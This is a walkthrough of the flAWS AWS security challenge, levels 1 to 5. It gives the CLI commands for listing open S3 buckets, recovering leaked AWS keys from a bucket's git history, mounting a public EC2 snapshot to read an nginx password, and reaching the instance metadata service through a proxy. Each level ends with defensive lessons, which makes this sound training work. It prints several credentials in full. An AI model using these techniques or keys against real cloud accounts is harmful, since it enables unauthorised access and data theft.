## Welcome to the flAWS challenge!

#### Resourcs:
- Flaws.cloud: http://flaws.cloud
- AWS CLI: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html
- Grayhatwarefare: https://buckets.grayhatwarfare.com
- AWS Bucket Dump: https://github.com/jordanpotti/AWSBucketDump
- Worst S3 Hacks: https://www.bitdefender.com/blog/businessinsights/worst-amazon-breaches/

-------------------
# Levels:
 - [Level 1](#level-1)
 - [Level 2](#level-2)
 - [Level 3](#level-3)
 - [Level 4](#level-4)
 - [Level 5](#level-5)
 - [Level 6](#level-6)
-------------------

# Level 1
This level is *buckets* of fun. http://flaws.cloud/

The site flaws.cloud is hosted as an S3 bucket. This is a great way to host a static site, similar to hosting one via github pages. Some interesting facts about S3 hosting: When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud). Also, S3 buckets are a global name space, meaning two people cannot have buckets with the same name. The result of this is we could create a bucket named apple.com and Apple would never be able host their main site via S3 hosting.

We can determine the site is hosted as an S3 bucket by running a DNS lookup on the domain, such as: 
```
└─$ nslookup Flaws.cloud
```
```
Non-authoritative answer:
Name:   flaws.cloud
Address: 52.218.181.18
Name:   flaws.cloud
Address: 52.218.152.106
Name:   flaws.cloud
Address: 52.92.186.75
Name:   flaws.cloud
Address: 52.92.195.211
Name:   flaws.cloud
Address: 52.218.213.58
Name:   flaws.cloud
Address: 52.218.217.26
Name:   flaws.cloud
Address: 52.92.139.115
Name:   flaws.cloud
Address: 52.92.249.3
```
We can then run: 
```
└─$ nslookup 52.218.181.18
```
```
18.181.218.52.in-addr.arpa      name = s3-website-us-west-2.amazonaws.com.

Authoritative answers can be found from:
```
So we know it's hosted in the AWS region us-west-2 s3 bucket.
flaws.cloud can also be visited by going to http://flaws.cloud.s3-website-us-west-2.amazonaws.com/ 

We now know that they have a bucket named `flaws.cloud` in `us-west-2`, so we can attempt to browse the bucket by using the aws cli by running: 
```
└─$ aws s3 ls s3://flaws.cloud
```
```

Unable to locate credentials. You can configure credentials by running "aws configure".
```

Let's try adding --no-sign-request
```
└─$ aws s3 ls s3://flaws.cloud --no-sign-request
```
```
2017-03-14 08:30:38       2575 hint1.html
2017-03-03 09:35:17       1707 hint2.html
2017-03-03 09:35:11       1101 hint3.html
2020-05-22 23:46:45       3162 index.html
2018-07-10 22:17:16      15979 logo.png
2017-02-27 07:29:28         46 robots.txt
2017-02-27 07:29:30       1051 secret-dd02c7c.html
```
BOOM!!!
Let's Download this secret using this command:
```
└─$ aws s3 cp s3://flaws.cloud/secret-dd02c7c.html --no-sign-request secret.html
```
```
download: s3://flaws.cloud/secret-dd02c7c.html to ./secret.html
```
and Open it
```
└─$ open secret.html
```
```
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|

Congrats! You found the secret file!
Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
```

### Lesson learned
On AWS you can set up S3 buckets with all sorts of permissions and functionality including using them to host static files. A number of people accidentally open them up with permissions that are too loose. Just like how you shouldn't allow directory listings of web servers, you shouldn't allow bucket listings.
#### Examples of this problem
- Directory listing of S3 bucket of [Legal Robot](https://hackerone.com/reports/163476) and [Shopify](https://hackerone.com/reports/57505).
- Read and write permissions to S3 bucket for [Shopify again](https://hackerone.com/reports/111643) and [Udemy](https://hackerone.com/reports/131468). This challenge did not have read and write permissions, as that would destroy the challenge for other players, but it is a common problem. 

### Avoiding the mistake
By default, S3 buckets are private and secure when they are created. To allow it to be accessed as a web page, I had turn on "Static Website Hosting" and changed the bucket policy to allow everyone "s3:GetObject" privileges, which is fine if you plan to publicly host the bucket as a web page. But then to introduce the flaw, I changed the permissions to add "Everyone" to have "List" permissions. "Everyone" means everyone on the Internet. You can also list the files simply by going to http://flaws.cloud.s3.amazonaws.com/ due to that List permission. 

This screenshot is from the webconsole in 2017.

![image-permissions](https://github.com/GTekSD/SUASS/assets/55411358/636608b2-f2d2-4805-8dd0-7312a75aa825)

This screenshot is from the webconsole in 2024.

![Everyone-2024](https://github.com/GTekSD/SUASS/assets/55411358/e2d715f9-7ce3-410e-b249-d942fef04d8d)

--------------------

# Level 2
Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud

This level is fairly similar, with a slight twist. we're going to need our own AWS account for this. we just need the free tier. 

Create a IAM user with permissions of "AmazonS3FullAccess" and create a access keys for AWS Cli.

We need our own AWS key, and we need to use the AWS CLI. Similar to the first level, we can discover that this sub-domain is hosted as an S3 bucket with the name "level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud".

By using this command, we're letting the CLI know which set of credentials it should use when accessing AWS resources.
```
└─$ aws configure --profile gteksd
```
```
AWS Access Key ID [None]: AKIAZ34HBEFSHI4VJEP4F
AWS Secret Access Key [None]: //YlybQlLErQz0gsdfvktUYG4l5WDFQAXNfzvhUz
Default region name [None]: 
Default output format [None]: 
```

Its permissions are too loose, but we need our own AWS account to see what's inside. Using our own account we can run: 
```
└─$ aws s3 ls --profile gteksd s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
```
```
2017-02-27 07:32:15      80751 everyone.png
2017-03-03 09:17:17       1433 hint1.html
2017-02-27 07:34:39       1035 hint2.html
2017-02-27 07:32:14       2786 index.html
2017-02-27 07:32:14         26 robots.txt
2017-02-27 07:32:15       1051 secret-e4443fc.html
```

BOOM!!!
Let's save the secret2 file.
```
└─$ aws s3 cp --profile gteksd s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html secret2.html
```
```
download: s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html to ./secret2.html
```

```
└─$ open secret2.html
```
```
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|

Congrats! You found the secret file!
Level 3 is at http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
```

### Lesson learned
Similar to opening permissions to "Everyone", people accidentally open permissions to "Any Authenticated AWS User". They might mistakenly think this will only be users of their account, when in fact it means anyone that has an AWS account.

### Examples of this problem
- Open permissions for authenticated AWS user on Shopify (link) 

### Avoiding the mistake
Only open permissions to specific AWS users. This screenshot is from the webconsole in 2017.

![Permissions-2017](https://github.com/GTekSD/SUASS/assets/55411358/e0ac40e8-1a8b-485c-a2f4-966f196a1c97)

This screenshot is from the webconsole in 2024.

![Permissions-2024](https://github.com/GTekSD/SUASS/assets/55411358/2ed85f34-017e-46f9-873f-e8f9074aae71)

--------------------

# Level 3
Level 3 is at http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud

Like the first level, we should have figured out how to list the files in this directory, and seen that listing in this bucket is open to "Everyone". See the file listing at level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.amazonaws.com
```
└─$ aws s3 ls --profile gteksd s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
```
```
                           PRE .git/
2017-02-27 05:44:33     123637 authenticated_users.png
2017-02-27 05:44:34       1552 hint1.html
2017-02-27 05:44:34       1426 hint2.html
2017-02-27 05:44:35       1247 hint3.html
2017-02-27 05:44:33       1035 hint4.html
2020-05-22 23:51:10       1861 index.html
2017-02-27 05:44:33         26 robots.txt
```

This S3 bucket has a .git file. There are probably interesting things in it. Download this whole S3 bucket using: 

```
└─$ aws s3 sync --profile gteksd s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ./flAWS-L3
```
```
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/post-update.sample to flAWS-L3/.git/hooks/post-update.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/config to flAWS-L3/.git/config                                                                  
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to flAWS-L3/.git/COMMIT_EDITMSG                                                  
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to flAWS-L3/.git/HEAD                                                                      
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/description to flAWS-L3/.git/description                                                        
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-commit.sample to flAWS-L3/.git/hooks/pre-commit.sample                                
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-applypatch.sample to flAWS-L3/.git/hooks/pre-applypatch.sample                        
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/applypatch-msg.sample to flAWS-L3/.git/hooks/applypatch-msg.sample                                                
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/commit-msg.sample to flAWS-L3/.git/hooks/commit-msg.sample                                                        
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-rebase.sample to flAWS-L3/.git/hooks/pre-rebase.sample                                                        
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/prepare-commit-msg.sample to flAWS-L3/.git/hooks/prepare-commit-msg.sample                                                                        
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/index to flAWS-L3/.git/index                                                                                                                            
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df to flAWS-L3/.git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/info/exclude to flAWS-L3/.git/info/exclude                                                                                                              
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/refs/heads/master to flAWS-L3/.git/logs/refs/heads/master                                                                                          
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c to flAWS-L3/.git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/update.sample to flAWS-L3/.git/hooks/update.sample                                                                                                
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c to flAWS-L3/.git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b to flAWS-L3/.git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/c2/aab7e03933a858d1765090928dca4013fe2526 to flAWS-L3/.git/objects/c2/aab7e03933a858d1765090928dca4013fe2526                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2 to flAWS-L3/.git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25 to flAWS-L3/.git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/HEAD to flAWS-L3/.git/logs/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2 to flAWS-L3/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/refs/heads/master to flAWS-L3/.git/refs/heads/master
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html to flAWS-L3/hint1.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61 to flAWS-L3/.git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f2/a144957997f15729d4491f251c3615d508b16a to flAWS-L3/.git/objects/f2/a144957997f15729d4491f251c3615d508b16a
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 to flAWS-L3/.git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint2.html to flAWS-L3/hint2.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/robots.txt to flAWS-L3/robots.txt
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/index.html to flAWS-L3/index.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint3.html to flAWS-L3/hint3.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint4.html to flAWS-L3/hint4.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/76/e4934c9de40e36f09b4e5538236551529f723c to flAWS-L3/.git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png to flAWS-L3/authenticated_users.png
```

Let's search this bucket.
```
└─$ cd .git
```
```
└─$ cat logs/refs/heads/master
```
```
0000000000000000000000000000000000000000 f52ec03b227ea6094b04e43f475fb0126edb5a61 0xdabbad00 <scott@summitroute.com> 1505661007 -0600   commit (initial): first commit
f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 0xdabbad00 <scott@summitroute.com> 1505661043 -0600   commit: Oops, accidentally added something I shouldn't have
```

People often accidentally add secret things to git repos, and then try to remove them without revoking or rolling the secrets. You can look through the history of a git repo by running: 
```
└─$ git log                               
```
```
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

Then you can look at what a git repo looked like at the time of a commit by running: 
```
└─$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
```
where `f7cebc46b471ca9838a0bdd1074bb498a3f84c87` would be the hash for the commit shown in `git log`.
```
M       index.html
Note: switching to 'f52ec03b227ea6094b04e43f475fb0126edb5a61'.

You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may do so (now or later) by using -c with the switch command.
Example:
  git switch -c <new-branch-name>

Or undo this operation with:
  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at f52ec03 first commit
                                      
```

```
└─$ cat access_keys.txt
```
```
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys
```
We should have found the AWS key and secret. 

We can configure your aws command to use it and create a profile for it using: 
```
└─$ aws configure --profile sike  
```
```
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [None]: OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys
Default region name [None]: 
Default output format [None]: 
```

Then to list S3 buckets using that profile run: 
```
└─$ aws s3 ls --profile sike
```
```
2017-02-13 03:01:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 22:04:53 config-bucket-975426262029
2017-02-13 01:33:24 flaws-logs
2017-02-05 09:10:07 flaws.cloud
2017-02-24 07:24:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 23:45:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 23:46:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-27 01:14:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-27 01:17:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-27 01:36:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

### Lesson learned
People often leak AWS keys and then try to cover up their mistakes without revoking the keys. You should always revoke any AWS keys (or any secrets) that could have been leaked or were misplaced. Roll your secrets early and often.

#### Examples of this problem
- [Instagram's Million Dollar Bug](http://www.exfiltrated.com/research-Instagram-RCE.php): In this must read post, a bug bounty researcher uncovered a series of flaws, including finding an S3 bucket that had .tar.gz archives of various revisions of files. One of these archives contained AWS creds that then allowed the researcher to access all S3 buckets of Instagram. For more discussion of how some of the problems discovered could have been avoided, see the post ["Instagram's Million Dollar Bug": Case study for defense ](https://summitroute.com/blog/2015/12/24/instagram_bounty_case_study_for_defense/)

Another interesting issue this level has exhibited, although not that worrisome, is that you can't restrict the ability to list only certain buckets in AWS, so if you want to give an employee the ability to list some buckets in an account, they will be able to list them all. The key you used to discover this bucket can see all the buckets in the account. You can't see what is in the buckets, but you'll know they exist. Similarly, be aware that buckets use a global namespace meaning that bucket names must be unique across all customers, so if you create a bucket named `merger_with_company_Y` or something that is supposed to be secret, it's technically possible for someone to discover that bucket exists.

### Avoiding this mistake
Always roll your secrets if you suspect they were compromised or made public or stored or shared incorrectly. Roll early, roll often. Rolling secrets means that you revoke the keys (ie. delete them from the AWS account) and generate new ones. 

--------------------

# Level 4
For the next level, We need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. 

We can snapshot the disk volume of an EC2 as a backup. In this case, the snapshot was made public, but we'll need to find it.

To do this, first we need the account ID, which we can get using the AWS key from the previous level: 
```
aws --profile sike sts get-caller-identity
```
```
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

Using that command also tells you the name of the account, which in this case is named "backup". The backups this account makes are snapshots of EC2s. Next, discover the snapshot: 
```
aws --profile sike ec2 describe-snapshots --owner-id 975426262029
```
```
You must specify a region. You can also configure your region by running "aws configure".
```

To identify a region, we need to run nslookup on domain.
```
└─$ nslookup level4-1156739cfb264ced6de514971a4bef68.flaws.cloud           
```
```
Server:         8.8.8.8
Address:        8.8.8.8#53

Non-authoritative answer:
Name:   level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
Address: 52.92.145.91
Name:   level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
Address: 52.92.209.203
Name:   level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
Address: 52.218.246.122
Name:   level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
```
and now on ip:
```
└─$ nslookup 52.92.145.91 && nslookup 52.92.209.203 
```
```
91.145.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.

203.209.92.52.in-addr.arpa      name = s3-website-us-west-2.amazonaws.com.
```
We have identify that this snapshot is in us-west-2 region.

Now configure us-west-2 region.
```
└─$ aws configure --profile sike
```
```
AWS Access Key ID [****************T7SA]: 
AWS Secret Access Key [****************3Jys]: 
Default region name [None]: us-west-2
Default output format [None]: 
```
We specify the owner-id just to filter the output. 
```
└─$ aws --profile sike ec2 describe-snapshots --owner-id 975426262029
```
```
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard"
        }
    ]
}

```
For fun, run that command without the owner-id and notice all the snapshots that are publicy readable. By default snapshots are private, and you can transfer them between accounts securely by specifiying the account ID of the other account, but a number of people just make them public and forget about them it seems.

Now that you know the snapshot ID, we're going to want to mount it. we'll need to do this in our own AWS account.

First, create a volume using the snapshot: 

Note:  Configure IAM user with permissions of "AdministratorAccess" under (IAM > Users > gteksds3hacker > Add permissions > Attach policies directly > Permissions policies)
```
└─$ aws --profile gteksd ec2 create-volume --availability-zone us-west-2b --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89
```
```
{
    "AvailabilityZone": "us-west-2b",
    "CreateTime": "2024-02-15T07:51:19+00:00",
    "Encrypted": false,
    "Size": 8,
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "State": "creating",
    "VolumeId": "vol-070719fc38dfc071e",
    "Iops": 100,
    "Tags": [],
    "VolumeType": "gp2",
    "MultiAttachEnabled": false
}
```
Now in the console we can create an EC2 (I prefer kali, but any linux will do) in the us-west-2 region and in the storage options, choose the volume you just created.

```
└─$ chmod 400 gteksd-flaws-key.pem
```

SSH in with something like:
```
└─$ ssh ubuntu@54.189.161.23 -i gteksd-flaws-key.pem
```
```
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1017-aws x86_64)
```

We'll need to mount this extra volume by running: 

Let's list the available volume information by hitting `lsblk`
```
ubuntu@ip-172-31-28-181:~$ lsblk
```
```
NAME     MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
loop0      7:0    0  24.9M  1 loop /snap/amazon-ssm-agent/7628
loop1      7:1    0  55.7M  1 loop /snap/core18/2812
loop2      7:2    0  63.5M  1 loop /snap/core20/2015
loop3      7:3    0 111.9M  1 loop /snap/lxd/24322
loop4      7:4    0  40.9M  1 loop /snap/snapd/20290
loop5      7:5    0  40.4M  1 loop /snap/snapd/20671
loop6      7:6    0  63.9M  1 loop /snap/core20/2105
loop7      7:7    0    87M  1 loop /snap/lxd/27037
xvda     202:0    0     8G  0 disk 
├─xvda1  202:1    0   7.9G  0 part /
├─xvda14 202:14   0     4M  0 part 
└─xvda15 202:15   0   106M  0 part /boot/efi
xvdf     202:80   0     8G  0 disk 
└─xvdf1  202:81   0     8G  0 part
```

Let's mount our attached volume:
```
ubuntu@ip-172-31-28-181:~$ sudo mount /dev/xvdf1 /mnt
```
```shell
ubuntu@ip-172-31-28-181:~$ cd /mnt/
ubuntu@ip-172-31-28-181:/mnt$ ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
```

Now, we'll have to look around for something that might tell us the password. 
```
ubuntu@ip-172-31-28-181:~$ cd /mnt/home/ubuntu/
ubuntu@ip-172-31-28-181:/mnt/home/ubuntu$ ls
meta-data  setupNginx.sh
```

In the ubuntu user's home directory is the file: `/home/ubuntu/setupNginx.sh`
```
ubuntu@ip-172-31-28-181:/mnt/home/ubuntu$ cat setupNginx.sh
```
```
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```
HA GOT'EEEEMM!!!! That is the username and password for the user. Enter those at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

```
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|

flAWS - Level 5
Good work getting in. This level is described at http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
```

### Lesson learned
AWS allows you to make snapshots of EC2's and databases (RDS). The main purpose for that is to make backups, but people sometimes use snapshots to get access back to their own EC2's when they forget the passwords. This also allows attackers to get access to things. Snapshots are normally restricted to your own account, so a possible attack would be an attacker getting access to an AWS key that allows them to start/stop and do other things with EC2's and then uses that to snapshot an EC2 and spin up an EC2 with that volume in your environment to get access to it. Like all backups, you need to be cautious about protecting them. 

--------------------

# Level 5
This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/ 

Let's see if we can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it. 

On cloud services, including AWS, the IP 169.254.169.254 is magical. It's the metadata service.

There is an RFC on it ([RFC-3927](https://datatracker.ietf.org/doc/html/rfc3927)), but you should read the AWS specific docs on it [here](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html). 

